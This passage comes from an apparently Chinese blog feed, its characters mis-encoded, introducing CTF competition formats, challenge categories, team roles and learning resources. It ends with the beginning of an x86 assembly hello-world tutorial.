èµ›åˆ¶ä»‹ç»"></a>2.4.1 èµ›åˆ¶ä»‹ç»</h4><p>å¦‚å®˜ç½‘ä»‹ç»è¿™æ ·ï¼ŒBELLUMINAR CTF èµ›åˆ¶ç”±å—é‚€å‚èµ›é˜Ÿä¼ç›¸äº’å‡ºé¢˜æŒ‘æˆ˜ï¼Œå¹¶åœ¨æ¯”èµ›ç»“æŸååˆ†äº«èµ›é¢˜çš„å‡ºé¢˜æ€è·¯ï¼Œå­¦ä¹ è¿‡ç¨‹ä»¥åŠè§£é¢˜æ€è·¯ç­‰ã€‚æˆ˜é˜Ÿè¯„åˆ†ä¾æ®å‡ºé¢˜å¾—åˆ†ï¼Œè§£é¢˜å¾—åˆ†å’Œåˆ†äº«å¾—åˆ†ï¼Œè¿›è¡Œç»¼åˆè¯„ä»·å¹¶å¾—å‡ºæœ€ç»ˆçš„æ’åã€‚</p><h4 id="2-4-2-å‡ºé¢˜é˜¶æ®µ"><a href="#2-4-2-å‡ºé¢˜é˜¶æ®µ" class="headerlink" title="2.4.2 å‡ºé¢˜é˜¶æ®µ"></a>2.4.2 å‡ºé¢˜é˜¶æ®µ</h4><p>é¦–å…ˆå„ä¸ªå—é‚€å‚èµ›é˜Ÿä¼éƒ½å¿…é¡»åœ¨æ­£å¼æ¯”èµ›å‰å‡º 2 é“ Challangeã€‚å‚èµ›é˜Ÿä¼å°†æœ‰ 12 å‘¨çš„æ—¶é—´å‡†å¤‡ Challengeã€‚å‡º Challenge çš„ç§¯åˆ†å æ€»åˆ†çš„ 30%ã€‚</p><p>ä¼ ç»Ÿçš„ BELLUMINAR èµ›åˆ¶è¦æ±‚å‡ºçš„ä¸¤é“ Challenge ä¸­ä¸€é“ Challenge å¿…é¡»æ˜¯åœ¨ Linux å¹³å°ï¼Œå¦å¤–ä¸€ä¸ª Challenge åˆ™ä¸ºé Linux å¹³å°ã€‚ä¸¤ä¸ª Challenge çš„ç±»å‹æ²¡æœ‰åšå‡ºé™åˆ¶ã€‚å› æ­¤é˜Ÿä¼å¯ä»¥å°½æƒ…å±•ç°è‡ªå·±çš„æŠ€æœ¯æ°´å¹³ã€‚</p><p>ä¸ºä½¿æ¯”èµ› Challenge ç±»å‹æ¯”è¾ƒå‡è¡¡ï¼Œä¹Ÿæœ‰é‡‡ç”¨é˜Ÿä¼æŠ½ç­¾å‡º Challenge çš„æ–¹å¼æŠ½å–è‡ªå·±çš„ Challengeï¼Œè¿™è¦æ±‚é˜Ÿä¼èƒ½åŠ›æ°´å¹³æ›´ä¸ºå…¨é¢ï¼Œå› æ­¤ä¸ºäº†ä¸å¤±å¹³è¡¡æ€§ï¼Œä¹Ÿä¼šå°†ä¸¤é“ Challenge çš„è®¡å…¥ä¸åŒåˆ†å€¼ï¼ˆæ¯”å¦‚è¦æ±‚å…¶ä¸­ä¸€é“ Challenge åˆ†å€¼ä¸º 200ï¼Œè€Œå¦å¤–ä¸€é“åˆ†å€¼åˆ™ä¸º 100ï¼‰ã€‚</p><h4 id="2-4-3-æäº¤éƒ¨ç½²"><a href="#2-4-3-æäº¤éƒ¨ç½²" class="headerlink" title="2.4.3 æäº¤éƒ¨ç½²"></a>2.4.3 æäº¤éƒ¨ç½²</h4><p>é¢˜ç›®æäº¤æˆªæ­¢ä¹‹å‰ï¼Œå„ä¸ªé˜Ÿä¼éœ€è¦æäº¤å®Œæ•´çš„æ–‡æ¡£ä»¥åŠè§£é¢˜ Writeupï¼Œæ–‡æ¡£ä¸­è¦æ±‚è¯¦ç»†æ ‡æ˜é¢˜ç›®åˆ†å€¼ï¼Œé¢˜é¢ï¼Œå‡ºé¢˜è´Ÿè´£äººï¼Œè€ƒå¯ŸçŸ¥è¯†ç‚¹åˆ—è¡¨ä»¥åŠé¢˜ç›®æºç ã€‚è€Œè§£é¢˜ Writeup ä¸­åˆ™éœ€è¦åŒ…å«æ“ä½œç¯å¢ƒï¼Œå®Œæ•´è§£é¢˜è¿‡ç¨‹ä»¥åŠè§£é¢˜ä»£ç ã€‚</p><p>é¢˜ç›®æäº¤ä¹‹åä¸»åŠæ–¹ä¼šå¯¹é¢˜ç›®å’Œè§£é¢˜ä»£ç è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœæœŸé—´å‡ºç°é—®é¢˜åˆ™éœ€è¦è¯¥é¢˜è´Ÿè´£äººé…åˆä»¥è§£å†³é—®é¢˜ã€‚æœ€ç»ˆæ”¾åˆ°æ¯”èµ›å¹³å°ä¸Šã€‚</p><h4 id="2-4-4-è§£é¢˜ç«æŠ€"><a href="#2-4-4-è§£é¢˜ç«æŠ€" class="headerlink" title="2.4.4 è§£é¢˜ç«æŠ€"></a>2.4.4 è§£é¢˜ç«æŠ€</h4><p>è¿›å…¥æ¯”èµ›åï¼Œå„æ”¯é˜Ÿä¼å¯ä»¥çœ‹åˆ°æ‰€æœ‰å…¶ä»–å›¢é˜Ÿå‡ºçš„é¢˜ç›®å¹¶å‘èµ·æŒ‘æˆ˜ï¼Œä½†æ˜¯ä¸èƒ½è§£ç­”æœ¬é˜Ÿå‡ºçš„é¢˜ç›®ï¼Œä¸è®¾ First Blood å¥–åŠ±ï¼Œæ ¹æ®è§£é¢˜ç§¯åˆ†è¿›è¡Œæ’åã€‚è§£é¢˜ç§¯åˆ†å æ€»åˆ†çš„ 60%ã€‚</p><p>æ¯”èµ›ç»“æŸåï¼Œé˜Ÿä¼ä¼‘æ¯ï¼Œå¹¶å‡†å¤‡åˆ¶ä½œåˆ†äº« PPTï¼ˆä¹Ÿå¯ä»¥åœ¨å‡ºé¢˜é˜¶æ®µå‡†å¤‡å¥½ï¼‰ã€‚åˆ†äº«ä¼šæ—¶ï¼Œå„é˜Ÿæ´¾ 2 åé˜Ÿå‘˜ä¸Šå°åˆ†äº«å‡ºé¢˜è§£é¢˜æ€è·¯ï¼Œå­¦ä¹ è¿‡ç¨‹ä»¥åŠè€ƒå¯ŸçŸ¥è¯†ç‚¹ç­‰ã€‚</p><h4 id="2-4-5-è®¡åˆ†è§„åˆ™"><a href="#2-4-5-è®¡åˆ†è§„åˆ™" class="headerlink" title="2.4.5 è®¡åˆ†è§„åˆ™"></a>2.4.5 è®¡åˆ†è§„åˆ™</h4><p>å‡ºé¢˜ç§¯åˆ†ï¼ˆå æ€»åˆ† 30%ï¼‰æœ‰ 50% ç”±è¯„å§”æ ¹æ®é¢˜ç›®æäº¤çš„è¯¦ç»†ç¨‹åº¦ï¼Œå®Œæ•´åº¦ï¼Œæäº¤æ—¶é—´ç­‰è¿›è¯„åˆ†ï¼Œå¦å¤– 50% åˆ™æ ¹æ®æ¯”èµ›ç»“æŸåçš„æœ€ç»ˆè§£é¢˜æƒ…å†µè¿›è¡Œè¯„åˆ†ã€‚è®¡åˆ†å…¬å¼ç¤ºä¾‹ï¼š Score = MaxScore â€” | N â€” Expectï¼¿N | ã€‚N ä»£è¡¨è§£å‡ºè¯¥é¢˜çš„é˜Ÿä¼æ•°é‡ï¼Œè€Œ Expectï¼¿N åˆ™æ˜¯è¿™é“é¢˜é¢„æœŸè§£å‡ºçš„é¢˜ç›®æ•°é‡ã€‚åªæœ‰å½“é¢˜ç›®éš¾åº¦é€‚ä¸­ï¼Œè§£é¢˜é˜Ÿä¼æ•°é‡è¶Šæ¥è¿‘é¢„æœŸæ•°é‡ Expectï¼¿Nï¼Œåˆ™è¿™é“é¢˜çš„å‡ºé¢˜é˜Ÿä¼å¾—åˆ°çš„å‡ºé¢˜ç§¯åˆ†è¶Šé«˜ã€‚</p><p>è§£é¢˜ç§¯åˆ†ï¼ˆå æ€»ç§¯åˆ† 60%ï¼‰åœ¨è®¡ç®—æ—¶ä¸è€ƒè™‘ First Blood å¥–åŠ±ã€‚</p><p>åˆ†äº«ç§¯åˆ†ï¼ˆå  10%ï¼‰ç”±è¯„å§”å’Œå…¶ä»–é˜Ÿä¼æ ¹æ®å…¶æŠ€æœ¯åˆ†äº«å†…å®¹è¿›è¡Œè¯„åˆ†å¾—å‡ºï¼ˆè€ƒè™‘åˆ†äº«æ—¶é—´ä»¥åŠå…¶ä»–é™åˆ¶ï¼‰ï¼Œä¼šè®¡ç®—å¹³å‡å€¼ã€‚</p><h2 id="3-CTFå„å¤§é¢˜å‹ç®€ä»‹"><a href="#3-CTFå„å¤§é¢˜å‹ç®€ä»‹" class="headerlink" title="3 CTFå„å¤§é¢˜å‹ç®€ä»‹"></a>3 CTFå„å¤§é¢˜å‹ç®€ä»‹</h2><h3 id="3-1-MISC-å®‰å…¨æ‚é¡¹"><a href="#3-1-MISC-å®‰å…¨æ‚é¡¹" class="headerlink" title="3.1 MISC(å®‰å…¨æ‚é¡¹)"></a>3.1 MISC(å®‰å…¨æ‚é¡¹)</h3><p>å…¨ç§°Miscellaneousã€‚é¢˜ç›®æ¶‰åŠæµé‡åˆ†æã€ç”µå­å–è¯ã€äººè‚‰æœç´¢ã€æ•°æ®åˆ†æã€å¤§æ•°æ®ç»Ÿè®¡ç­‰ç­‰ï¼Œè¦†ç›–é¢æ¯”è¾ƒå¹¿ã€‚æˆ‘ä»¬å¹³æ—¶çœ‹åˆ°çš„ç¤¾å·¥ç±»é¢˜ç›®ï¼›ç»™ä½ ä¸€ä¸ªæµé‡åŒ…è®©ä½ åˆ†æçš„é¢˜ç›®ï¼›å–è¯åˆ†æé¢˜ç›®ï¼Œéƒ½å±äºè¿™ç±»é¢˜ç›®ã€‚ä¸»è¦è€ƒæŸ¥å‚èµ›é€‰æ‰‹çš„å„ç§åŸºç¡€ç»¼åˆçŸ¥è¯†ï¼Œè€ƒå¯ŸèŒƒå›´æ¯”è¾ƒå¹¿ã€‚</p><h3 id="3-2-REVERSE-é€†å‘"><a href="#3-2-REVERSE-é€†å‘" class="headerlink" title="3.2 REVERSE(é€†å‘)"></a>3.2 REVERSE(é€†å‘)</h3><p>é¢˜ç›®æ¶‰åŠåˆ°è½¯ä»¶é€†å‘ã€ç ´è§£æŠ€æœ¯ç­‰ï¼Œè¦æ±‚æœ‰è¾ƒå¼ºçš„åæ±‡ç¼–ã€åç¼–è¯‘æ‰å®åŠŸåº•ã€‚éœ€è¦æŒæ¡æ±‡ç¼–ï¼Œå †æ ˆã€å¯„å­˜å™¨æ–¹é¢çš„çŸ¥è¯†ã€‚æœ‰å¥½çš„é€»è¾‘æ€ç»´èƒ½åŠ›ã€‚ä¸»è¦è€ƒæŸ¥å‚èµ›é€‰æ‰‹çš„é€†å‘åˆ†æèƒ½åŠ›ã€‚æ­¤ç±»é¢˜ç›®ä¹Ÿæ˜¯çº¿ä¸‹æ¯”èµ›çš„è€ƒå¯Ÿé‡ç‚¹ã€‚</p><h3 id="3-3-WEB-webç±»"><a href="#3-3-WEB-webç±»" class="headerlink" title="3.3 WEB(webç±»)"></a>3.3 WEB(webç±»)</h3><p>WEBåº”ç”¨åœ¨ä»Šå¤©è¶Šæ¥è¶Šå¹¿æ³›ï¼Œä¹Ÿæ˜¯CTFå¤ºæ——ç«èµ›ä¸­çš„ä¸»è¦é¢˜å‹ï¼Œé¢˜ç›®æ¶‰åŠåˆ°å¸¸è§çš„Webæ¼æ´ï¼Œè¯¸å¦‚æ³¨å…¥ã€XSSã€æ–‡ä»¶åŒ…å«ã€ä»£ç å®¡è®¡ã€ä¸Šä¼ ç­‰æ¼æ´ã€‚è¿™äº›é¢˜ç›®éƒ½ä¸æ˜¯ç®€å•çš„æ³¨å…¥ã€ä¸Šä¼ é¢˜ç›®ï¼Œè‡³å°‘ä¼šæœ‰ä¸€å±‚çš„å®‰å…¨è¿‡æ»¤ï¼Œéœ€è¦é€‰æ‰‹æƒ³åŠæ³•ç»•è¿‡ã€‚ä¸”Webé¢˜ç›®æ˜¯å›½å†…æ¯”è¾ƒå¤šä¹Ÿæ˜¯å¤§å®¶æ¯”è¾ƒå–œæ¬¢çš„é¢˜ç›®ã€‚å› ä¸ºå¤§å¤šæ•°äººå¼€å§‹å®‰å…¨éƒ½æ˜¯ä»webæ—¥ç«™å¼€å§‹çš„ã€‚</p><h3 id="3-4-PWN-æº¢å‡º"><a href="#3-4-PWN-æº¢å‡º" class="headerlink" title="3.4 PWN(æº¢å‡º)"></a>3.4 PWN(æº¢å‡º)</h3><p>PWNåœ¨é»‘å®¢ä¿šè¯­ä¸­ä»£è¡¨ç€æ”»ç ´ï¼Œå–å¾—æƒé™ï¼Œåœ¨CTFæ¯”èµ›ä¸­å®ƒä»£è¡¨ç€æº¢å‡ºç±»çš„é¢˜ç›®ï¼Œå…¶ä¸­å¸¸è§ç±»å‹æº¢å‡ºæ¼æ´æœ‰æ ˆæº¢å‡ºã€å †æº¢å‡ºã€‚åœ¨CTFæ¯”èµ›ä¸­ï¼Œçº¿ä¸Šæ¯”èµ›ä¼šæœ‰ï¼Œä½†æ˜¯æ¯”ä¾‹ä¸ä¼šå¤ªé‡ï¼Œè¿›å…¥çº¿ä¸‹æ¯”èµ›ï¼Œé€†å‘å’Œæº¢å‡ºåˆ™æ˜¯æˆ˜é˜Ÿå®åŠ›çš„å…³é”®ã€‚ä¸»è¦è€ƒå¯Ÿå‚æ•°é€‰æ‰‹æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨èƒ½åŠ›ã€‚</p><h3 id="3-5-CRYPTO-å¯†ç å­¦"><a href="#3-5-CRYPTO-å¯†ç å­¦" class="headerlink" title="3.5 CRYPTO(å¯†ç å­¦)"></a>3.5 CRYPTO(å¯†ç å­¦)</h3><p>å…¨ç§°Cryptographyã€‚é¢˜ç›®è€ƒå¯Ÿå„ç§åŠ è§£å¯†æŠ€æœ¯ï¼ŒåŒ…æ‹¬å¤å…¸åŠ å¯†æŠ€æœ¯ã€ç°ä»£åŠ å¯†æŠ€æœ¯ç”šè‡³å‡ºé¢˜è€…è‡ªåˆ›åŠ å¯†æŠ€æœ¯ã€‚å®éªŒå§â€œè§’æ–—åœºâ€ä¸­ï¼Œè¿™æ ·çš„é¢˜ç›®æ±‡é›†çš„æœ€å¤šã€‚è¿™éƒ¨åˆ†ä¸»è¦è€ƒæŸ¥å‚èµ›é€‰æ‰‹å¯†ç å­¦ç›¸å…³çŸ¥è¯†ç‚¹ã€‚</p><h3 id="3-6-STEGA-éšå†™"><a href="#3-6-STEGA-éšå†™" class="headerlink" title="3.6 STEGA(éšå†™)"></a>3.6 STEGA(éšå†™)</h3><p>å…¨ç§°Steganographyã€‚é¢˜ç›®çš„Flagä¼šéšè—åˆ°å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰å„ç±»æ•°æ®è½½ä½“ä¸­ä¾›å‚èµ›é€‰æ‰‹è·å–ã€‚è½½ä½“å°±æ˜¯å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œå¯èƒ½æ˜¯ä¿®æ”¹äº†è¿™äº›è½½ä½“æ¥éšè—flagï¼Œä¹Ÿå¯èƒ½å°†flagéšè—åœ¨è¿™äº›è½½ä½“çš„äºŒè¿›åˆ¶ç©ºç™½ä½ç½®ã€‚æœ‰æ—¶å€™éœ€è¦ä½ ä¾¦æ¢ç²¾ç¥è¶³å¤Ÿçš„å¼ºï¼Œæ‰èƒ½å‘ç°ã€‚æ­¤ç±»é¢˜ç›®ä¸»è¦è€ƒæŸ¥å‚èµ›é€‰æ‰‹çš„å¯¹å„ç§éšå†™å·¥å…·ã€éšå†™ç®—æ³•çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚å®éªŒå§â€œè§’æ–—åœºâ€çš„éšå†™é¢˜ç›®æ˜¯æ¯”è¾ƒå…¨çš„ï¼Œä»¥ä¸Šè¯´åˆ°çš„éƒ½æœ‰æ¶µç›–ã€‚æ–°æ‰‹ä»¬å¯ä»¥ä»æ­¤å…¥é—¨ã€‚</p><h3 id="3-7-PPC-ç¼–ç¨‹ç±»"><a href="#3-7-PPC-ç¼–ç¨‹ç±»" class="headerlink" title="3.7 PPC(ç¼–ç¨‹ç±»)"></a>3.7 PPC(ç¼–ç¨‹ç±»)</h3><p>å…¨ç§°Professionally Program Coderã€‚é¢˜ç›®æ¶‰åŠåˆ°ç¨‹åºç¼–å†™ã€ç¼–ç¨‹ç®—æ³•å®ç°ã€‚ç®—æ³•çš„é€†å‘ç¼–å†™ï¼Œæ‰¹é‡å¤„ç†ç­‰ï¼Œæœ‰æ—¶å€™ç”¨ç¼–ç¨‹å»å¤„ç†é—®é¢˜ï¼Œä¼šæ–¹ä¾¿çš„å¤šã€‚å½“ç„¶PPCç›¸æ¯”ACMæ¥è¯´ï¼Œè¿˜æ˜¯è¾ƒä¸ºå®¹æ˜“çš„ã€‚è¿™éƒ¨åˆ†ä¸»è¦è€ƒå¯Ÿé€‰æ‰‹çš„å¿«é€Ÿç¼–ç¨‹èƒ½åŠ›ã€‚</p><h2 id="4-CTFåˆ†å·¥åˆä½œ"><a href="#4-CTFåˆ†å·¥åˆä½œ" class="headerlink" title="4 CTFåˆ†å·¥åˆä½œ"></a>4 CTFåˆ†å·¥åˆä½œ</h2><p><strong>å¸¸è§„æ–¹å‘</strong></p><ul><li><strong>Aæ–¹å‘ï¼šPWN + RE + CRYPTO</strong></li><li><p><strong>Bæ–¹å‘ï¼šWEB + STEGA + MISC</strong></p></li><li><p>MISCï¼ŒPPC æ‰€æœ‰äººéƒ½éœ€è¦æœ‰ä¸€ä¸ªåŸºæœ¬çš„äº†è§£å’ŒæŒæ¡</p></li></ul><h2 id="5-CTFå­¦ä¹ å‚è€ƒ"><a href="#5-CTFå­¦ä¹ å‚è€ƒ" class="headerlink" title="5 CTFå­¦ä¹ å‚è€ƒ"></a>5 CTFå­¦ä¹ å‚è€ƒ</h2><h3 id="5-1-çŸ¥è¯†åœ°å›¾"><a href="#5-1-çŸ¥è¯†åœ°å›¾" class="headerlink" title="5.1 çŸ¥è¯†åœ°å›¾"></a>5.1 çŸ¥è¯†åœ°å›¾</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191014145659.png" alt=""></p><h3 id="5-2-å‚è€ƒä¹¦ç±"><a href="#5-2-å‚è€ƒä¹¦ç±" class="headerlink" title="5.2 å‚è€ƒä¹¦ç±"></a>5.2 å‚è€ƒä¹¦ç±</h3><ul><li>Aæ–¹å‘ï¼š<ul><li>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†</li><li>æ¶æ„ä»£ç åˆ†æå®æˆ˜</li><li>RE for Beginners</li><li>IDA Proæƒå¨æŒ‡å—</li><li>åŠ å¯†ä¸è§£å¯†</li></ul></li><li>Bæ–¹å‘ï¼š<ul><li>Webåº”ç”¨å®‰å…¨æƒå¨æŒ‡å—</li></ul></li></ul><h3 id="5-3-ç›¸å…³ç½‘ç«™"><a href="#5-3-ç›¸å…³ç½‘ç«™" class="headerlink" title="5.3 ç›¸å…³ç½‘ç«™"></a>5.3 ç›¸å…³ç½‘ç«™</h3><h4 id="5-3-1-å­¦ä¹ è·¯çº¿"><a href="#5-3-1-å­¦ä¹ è·¯çº¿" class="headerlink" title="5.3.1 å­¦ä¹ è·¯çº¿"></a>5.3.1 å­¦ä¹ è·¯çº¿</h4><ul><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html">çŸ¥é“åˆ›å®‡ç ”å‘æŠ€èƒ½è¡¨ v3.1</a></li><li><a href="https://skills.bugbank.cn/">æ¼æ´é“¶è¡Œ (BUGBANK) æŠ€èƒ½æ ‘</a></li><li><a href="http://evilcos.me/security_skill_tree_basic/index.html">å®‰å…¨æŠ€èƒ½æ ‘ç®€ç‰ˆ by ä½™å¼¦</a></li><li><a href="https://github.com/phith0n/Mind-Map">å®‰å…¨ç±»æ€ç»´å¯¼å›¾ by phith0n</a></li><li><a href="https://github.com/riusksk/secbook">ä¿¡æ¯å®‰å…¨ä»ä¸šè€…ä¹¦å•æ¨è</a></li></ul><h4 id="5-3-2-åœ¨çº¿å­¦ä¹ "><a href="#5-3-2-åœ¨çº¿å­¦ä¹ " class="headerlink" title="5.3.2 åœ¨çº¿å­¦ä¹ "></a>5.3.2 åœ¨çº¿å­¦ä¹ </h4><ul><li><p><a href="https://adworld.xctf.org.cn">æ”»é˜²ä¸–ç•Œ</a>: æ–°æ‰‹å…¥é—¨æ¨èçš„åˆ·é¢˜ç½‘ç«™ï¼ŒåŒ…å«CTFé¢˜å‹ä¸­çš„å¤§éƒ¨åˆ†</p></li><li><p><a href="http://www.ichunqiu.com/">i æ˜¥ç§‹ - ä¸“ä¸šçš„ç½‘ç»œå®‰å…¨ | ä¿¡æ¯å®‰å…¨åœ¨çº¿å­¦ä¹ åŸ¹è®­å¹³å°</a></p></li><li><a href="http://www.shiyanbar.com/">å®éªŒå§ï¼è®©å®éªŒæ›´ç®€å•ï¼</a></li><li><a href="https://www.kanxue.com/chm.htm">çœ‹é›ªçŸ¥è¯†åº“</a></li></ul><h4 id="5-3-3-ä¿¡æ¯èµ„è®¯"><a href="#5-3-3-ä¿¡æ¯èµ„è®¯" class="headerlink" title="5.3.3 ä¿¡æ¯èµ„è®¯"></a>5.3.3 ä¿¡æ¯èµ„è®¯</h4><ul><li><a href="http://www.freebuf.com/">FreeBuf.COM | å…³æ³¨é»‘å®¢ä¸æå®¢</a></li><li><a href="https://www.anquanke.com/">å®‰å…¨å®¢ - æœ‰æ€æƒ³çš„å®‰å…¨æ–°åª’ä½“</a></li><li><a href="http://www.4hou.com/">å˜¶å¼ RoarTalk â€“ å›å½’æœ€æœ¬è´¨çš„ä¿¡æ¯å®‰å…¨</a></li><li><a href="https://wiki.ioin.in/">Sec-News å®‰å…¨æ–‡æ‘˜</a></li><li><a href="https://www.freebuf.com">äº’è”ç½‘å®‰å…¨åª’ä½“FreeBuf</a></li><li>çŸ¥é“åˆ›å®‡</li><li>15PB ä¿¡æ¯å®‰å…¨æ•™è‚²</li><li>t00ls.net</li></ul><h4 id="5-3-4-æŠ€æœ¯è®ºå›"><a href="#5-3-4-æŠ€æœ¯è®ºå›" class="headerlink" title="5.3.4 æŠ€æœ¯è®ºå›"></a>5.3.4 æŠ€æœ¯è®ºå›</h4><ul><li><a href="http://www.52pojie.cn/">å¾çˆ±ç ´è§£</a></li><li><a href="http://bbs.pediy.com/">çœ‹é›ªè®ºå›</a></li><li><a href="https://xz.aliyun.com/">å…ˆçŸ¥ç¤¾åŒº</a></li><li><a href="https://bbs.ichunqiu.com/">i æ˜¥ç§‹è®ºå›</a></li></ul><h4 id="5-3-5-CTFèµ›äº‹"><a href="#5-3-5-CTFèµ›äº‹" class="headerlink" title="5.3.5 CTFèµ›äº‹"></a>5.3.5 CTFèµ›äº‹</h4><ul><li><a href="https://www.xctf.org.cn/">XCTF ç¤¾åŒº</a>: å…¨çƒèµ›äº‹èµ„è®¯ï¼Œç§¯åˆ†æ’åï¼ŒæŠ€æœ¯åˆ†äº«</li><li><a href="https://ctftime.org/">CTFtime</a></li><li><a href="https://ctfrank.org/">CTF Rank</a></li></ul><h4 id="5-3-6-CTF-OJ"><a href="#5-3-6-CTF-OJ" class="headerlink" title="5.3.6 CTF OJ"></a>5.3.6 CTF OJ</h4><ul><li><a href="http://oj.xctf.org.cn/">XCTF OJ</a></li><li><a href="https://www.ichunqiu.com/competition">CTF å¤§æœ¬è¥</a></li><li><a href="https://pwnhub.cn/index">pwnhub</a></li><li><a href="http://ctf.nuptsast.com/">å—é‚®ç½‘ç»œæ”»é˜²è®­ç»ƒå¹³å°</a></li><li><a href="http://hackinglab.cn/">HackingLab ç½‘ç»œä¿¡æ¯å®‰å…¨æ”»é˜²å­¦ä¹ å¹³å°</a></li><li><a href="http://ctf.bugku.com/">BugkuCTF</a></li><li><a href="https://www.wechall.net/">WeChall</a></li><li><a href="http://www.sniperoj.com/">Sniper OJ</a></li><li><a href="https://www.jarvisoj.com/">Jarvis OJ</a></li><li><a href="https://ctflearn.com/">CTF Learn</a></li><li><a href="https://hackme.inndy.tw/scoreboard/">Hackme CTF</a></li><li><a href="http://captf.com/practice-ctf/">Practice CTF List</a></li></ul><h4 id="5-3-7-æœ¬åœ°é¶åœº"><a href="#5-3-7-æœ¬åœ°é¶åœº" class="headerlink" title="5.3.7 æœ¬åœ°é¶åœº"></a>5.3.7 æœ¬åœ°é¶åœº</h4><ul><li>SQLi: <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li><li>DVWA: <a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a></li><li>metsploitable3: <a href="https://github.com/rapid7/metasploitable3/">https://github.com/rapid7/metasploitable3/</a></li><li>Webgoat: <a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></li><li>Juiceshop: <a href="https://github.com/bkimminich/juice-shop">https://github.com/bkimminich/juice-shop</a></li></ul><h4 id="5-3-8-CTF-å·¥å…·"><a href="#5-3-8-CTF-å·¥å…·" class="headerlink" title="5.3.8 CTF å·¥å…·"></a>5.3.8 CTF å·¥å…·</h4><ul><li><a href="https://tools.pediy.com/">çœ‹é›ªå·¥å…·</a></li><li><a href="https://down.52pojie.cn/Tools/">å¾çˆ±ç ´è§£å·¥å…·</a></li><li><a href="http://ctf.ssleye.com/">CTF åœ¨çº¿å·¥å…· by CTFcode</a></li><li><a href="http://tool.bugku.com/">CTF åœ¨çº¿å·¥å…·ç®± by bugku</a></li><li><a href="https://ctftools.com/down/">CTF å·¥å…·èµ„æºåº“ by HBCTF team</a></li><li><a href="https://github.com/zardus/ctf-tools">ctf-tools by zardus</a></li><li><a href="https://gchq.github.io/CyberChef/">The Cyber Swiss Army Knife</a></li></ul><h4 id="5-3-9-CTF-Writup"><a href="#5-3-9-CTF-Writup" class="headerlink" title="5.3.9 CTF Writup"></a>5.3.9 CTF Writup</h4><ul><li><a href="https://github.com/ctfs">CTFs Writeup é›†é”¦</a></li><li><a href="https://github.com/p4-team/ctf">CTF solution by p4 team</a></li></ul><h4 id="5-3-10-æ¼æ´å¤ç°"><a href="#5-3-10-æ¼æ´å¤ç°" class="headerlink" title="5.3.10 æ¼æ´å¤ç°"></a>5.3.10 æ¼æ´å¤ç°</h4><p>Vulhub: <a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86æ±‡ç¼–å­¦ä¹ ç¬”è®°(äºŒ)</title>
    <link href="/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/"/>
    <url>/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="1-win32çš„æ±‡ç¼–å¼€å‘æµç¨‹"><a href="#1-win32çš„æ±‡ç¼–å¼€å‘æµç¨‹" class="headerlink" title="1 win32çš„æ±‡ç¼–å¼€å‘æµç¨‹"></a>1 win32çš„æ±‡ç¼–å¼€å‘æµç¨‹</h2><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930154636.png" alt=""></p><span id="more"></span><h2 id="2-win32æ±‡ç¼–æºç¨‹åºçš„ç»“æ„"><a href="#2-win32æ±‡ç¼–æºç¨‹åºçš„ç»“æ„" class="headerlink" title="2 win32æ±‡ç¼–æºç¨‹åºçš„ç»“æ„"></a>2 win32æ±‡ç¼–æºç¨‹åºçš„ç»“æ„</h2><p><strong>Hello worldç¨‹åºåœ¨DOSæ±‡ç¼–ï¼š</strong></p><pre><code class="hljs asm">;å †æ ˆæ®µstack        segment stack            db100 dup (?)stack         ends;æ•°æ®æ®µdata        segmentszHello        db&#x27;Hello, world&#x27;,0dh,0ah,&#x27;$&#x27;data        ends;ä»£ç æ®µcode        segment            assumecs:code,ds:data,ss:stackstart:            movax,data            mov ds,ax                    mov ah,9            mov dx,offset,szHello            int 21hcode        ends            endstart</code></pre><p><strong>Hello worldçš„Win32ç¨‹åºï¼š</strong></p><pre><code class="hljs asm">        .386        .model flat,stdcall        option casemap:none;includeå®šä¹‰include        windows.incinclude     user32.incinclude     user32.libinclude        kernel32.incinclude     kernel32.lib;æ•°æ®æ®µ        .dataszCaption    db&#x27;A MessageBox&#x27;,0szText        db&#x27;Hello, world&#x27;,0;ä»£ç æ®µ        .codestart:        invokeMessageBox, NULL, offset szText, offset szCaption, MB_OK        invoke ExitProcess, NULL                end start</code></pre><h3 id="2-1-æ¨¡å¼å®šä¹‰"><a href="#2-1-æ¨¡å¼å®šä¹‰" class="headerlink" title="2.1 æ¨¡å¼å®šä¹‰"></a>2.1 æ¨¡å¼å®šä¹‰</h3><h4 id="2-1-1-æŒ‡å®šä½¿ç”¨çš„æŒ‡ä»¤é›†"><a href="#2-1-1-æŒ‡å®šä½¿ç”¨çš„æŒ‡ä»¤é›†" class="headerlink" title="2.1.1 æŒ‡å®šä½¿ç”¨çš„æŒ‡ä»¤é›†"></a>2.1.1 æŒ‡å®šä½¿ç”¨çš„æŒ‡ä»¤é›†</h4><p><code>.386</code>æ˜¯æ±‡ç¼–çš„ä¼ªæŒ‡ä»¤ï¼Œç”¨äºå‘Šè¯‰ç¼–è¯‘å™¨åœ¨æœ¬ç¨‹åºä¸­ä½¿ç”¨çš„æŒ‡ä»¤é›†ä¸º80386æ‰€æ‹¥æœ‰çš„æŒ‡ä»¤é›†ã€‚ç±»ä¼¼çš„æŒ‡ä»¤è¿˜æœ‰ï¼š<code>.8086, .186, .386p, .486/486p, 